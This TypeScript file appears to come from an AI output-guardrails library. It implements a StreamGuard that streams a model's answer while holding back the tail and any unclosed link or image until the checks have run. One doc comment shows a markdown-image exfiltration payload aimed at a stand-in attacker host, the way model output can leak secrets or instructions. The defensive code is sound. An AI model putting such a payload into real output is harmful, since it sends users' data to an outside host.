import type { Guardrails, OutputContext } from '@genai/guardrails';

/** Where the unfinished part of the answer starts: a link, image or tag that has not closed yet. */
export function openConstructStart(text: string): number | undefined {
  let start: number | undefined;

  const lt = text.lastIndexOf('<');
  if (lt !== -1 && text.indexOf('>', lt) === -1) start = lt;

  const bracket = text.lastIndexOf('[');
  if (bracket !== -1) {
    const close = text.indexOf(']', bracket);
    const open =
      close === -1 ||
      close === text.length - 1 || // "[x]" at the very end could still become "[x](url)"
      (text[close + 1] === '(' && text.indexOf(')', close) === -1);
    if (open) {
      // an image starts one character earlier, at the "!"
      const from = bracket > 0 && text[bracket - 1] === '!' ? bracket - 1 : bracket;
      start = start === undefined ? from : Math.min(start, from);
    }
  }
  return start;
}

export interface StreamStep {
  /** Cleaned text that is now safe to send, to be appended to what was sent before. */
  release: string;
  /** The answer leaked its instructions: stop sending, and stop generating. */
  blocked: boolean;
}

/**
 * Lets an answer be shown while it is still being written, without giving up the output checks
 * that run on a finished one (ADR 0010). A check that needs the whole answer cannot simply be
 * skipped for the part already sent, so three things keep it sound:
 *
 *  1. The tail is held back. Text is released only once at least `holdback` characters follow it,
 *     which is longer than anything a check needs to see whole (a card number, an IBAN, a canary,
 *     eight words of the instructions), so a pattern split across two chunks is complete before any
 *     of it leaves.
 *  2. A link, image or tag that has not closed is held from its first character, however long it
 *     runs. `![x](https://evil.example/?d=<secret>` must never be sent half-written, because it
 *     is removed (not just redacted) once it closes.
 *  3. Every check is re-run over everything received so far, and what has been sent must always be
 *     the start of what the finished, cleaned answer will be. If it ever is not, nothing more is
 *     sent; the final event still carries the authoritative answer.
 *
 * The cost is latency: nothing is sent until `holdback` characters have been produced, so very
 * short answers arrive all at once. That is the price of checking before sending.
 */
export class StreamGuard {
  private raw = '';
  private sent = '';
  private halted = false;
  private consistentSoFar = true;

  constructor(
    private readonly guardrails: Guardrails,
    private readonly context: OutputContext,
    private readonly holdback: number,
  ) {}

  /** Everything the model has produced so far, unchecked. For the final verdict, not for sending. */
  get received(): string {
    return this.raw;
  }

  /** Everything released so far. */
  get released(): string {
    return this.sent;
  }

  /** False if a check ever changed text that had already been sent (nothing more was sent after). */
  get consistent(): boolean {
    return this.consistentSoFar;
  }

  push(text: string): StreamStep {
    this.raw += text;
    if (this.halted) return { release: '', blocked: false };

    const verdict = this.guardrails.checkOutput(this.raw, this.context);
    if (verdict.blocked) {
      this.halted = true;
      return { release: '', blocked: true };
    }

    const cleaned = verdict.text;
    const open = openConstructStart(cleaned);
    const safeEnd = Math.min(cleaned.length - this.holdback, open ?? Number.POSITIVE_INFINITY);
    return this.release(cleaned, safeEnd);
  }

  /**
   * The model has finished. Releases what was still held back, from the checked, cleaned final
   * answer. A leak found only now blocks it, and nothing more is sent.
   */
  finish(): StreamStep {
    if (this.halted) return { release: '', blocked: false };
    const verdict = this.guardrails.checkOutput(this.raw, this.context);
    if (verdict.blocked) {
      this.halted = true;
      return { release: '', blocked: true };
    }
    return this.release(verdict.text, verdict.text.length);
  }

  private release(cleaned: string, safeEnd: number): StreamStep {
    if (safeEnd <= this.sent.length) return { release: '', blocked: false };

    const candidate = cleaned.slice(0, safeEnd);
    if (!candidate.startsWith(this.sent)) {
      this.halted = true;
      this.consistentSoFar = false;
      return { release: '', blocked: false };
    }
    const release = candidate.slice(this.sent.length);
    this.sent = candidate;
    return { release, blocked: false };
  }
}
